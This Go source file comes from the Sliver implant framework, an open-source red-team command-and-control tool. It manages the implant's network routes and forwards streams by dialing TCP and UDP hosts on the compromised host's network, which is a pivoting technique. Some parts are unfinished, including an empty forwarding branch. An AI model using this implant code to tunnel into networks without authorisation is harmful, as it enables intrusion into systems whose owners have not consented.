package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"fmt"
	"io"
	"sync"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	// Routes - All active network routes.
	Routes = &routes{
		Active: map[string]*route{},
		mutex:  &sync.Mutex{},
	}
)

type route struct {
	*sliverpb.Route
	IsGateway bool
	comms     *Comm
	pending   int
	mutex     *sync.Mutex
}

// routes - Holds all routes in which this implant is a node.
type routes struct {
	Active map[string]*route
	mutex  *sync.Mutex
}

// Add - The implant has received a route request from the server.
// TODO: If we have only len(Chain.Nodes) == 1, this means the last node
// is a subnet, not a further node in the chain. Therefore we register
// the special handler for net.Dial.
func (r *routes) Add(new *sliverpb.Route) (*sliverpb.Route, error) {

	route := &route{
		new,           // Info
		true,          // Always assume we are gateway
		nil,           // no comms assigned yet
		0,             // No pending connections
		&sync.Mutex{}, //
	}

	// If there are nodes, it means the first is us, the next is to be used
	if new.Nodes != nil && len(new.Nodes) > 1 {
		next := new.Nodes[1]
		for _, cc := range Comms.active {
			if cc.RemoteAddress == next.Host {
				route.comms = Comms.active[next.Host]
			}
		}
	} else {
		// If no nodes, it means we are the gateway, and no multiplexer
		// has to be referenced. We notify we are the gateway, for handlers.
		route.IsGateway = true
	}

	r.mutex.Lock()
	r.Active[new.ID] = route
	r.mutex.Unlock()
	return new, nil
}

// Remove - The implant has been ordered to stop routing traffic to a certain route.
// We do not accept further streams for this one, and deregister it.
func (r *routes) Remove(routeID string) (err error) {
	r.mutex.Lock()
	delete(r.Active, routeID)
	r.mutex.Unlock()
	return
}

// routeForwardConn - Given an ID (route/handler) and source:remote address, give this stream to the appropriate transport.
func routeForwardConn(route *route, cc *sliverpb.ConnectionInfo, stream io.ReadWriteCloser) {
	// {{if .Config.Debug}}
	log.Printf("Forwarding inbound stream: %s:%d --> %s:%d", cc.LHost, cc.LPort, cc.RHost, cc.RPort)
	// {{end}}

	// If we are the gateway to this route, directly dial hosts on the network and pipe.
	if route.IsGateway {
		switch cc.Transport {
		case sliverpb.TransportProtocol_TCP:
			// case "tcp", "mtls", "http", "https", "socks", "socks5":
			err := handleTCP(cc, stream)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error dialing TCP: %s:%d -> %s:%d", cc.LHost, cc.LPort, cc.RHost, cc.RPort)
				// {{end}}
				return
			}

		case sliverpb.TransportProtocol_UDP:
			// case "udp", "dns", "named_pipe":
			hostPort := fmt.Sprintf("%s:%d", cc.RHost, cc.RPort)
			err := handleUDP(stream, hostPort)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error dialing TCP: %s:%d -> %s:%d", cc.LHost, cc.LPort, cc.RHost, cc.RPort)
				// {{end}}
				return
			}
		}
	}

	// If more than one node in the route after us, pass connection to next node.
	if len(route.Nodes) > 1 {
		// Route to right comm
	}
}
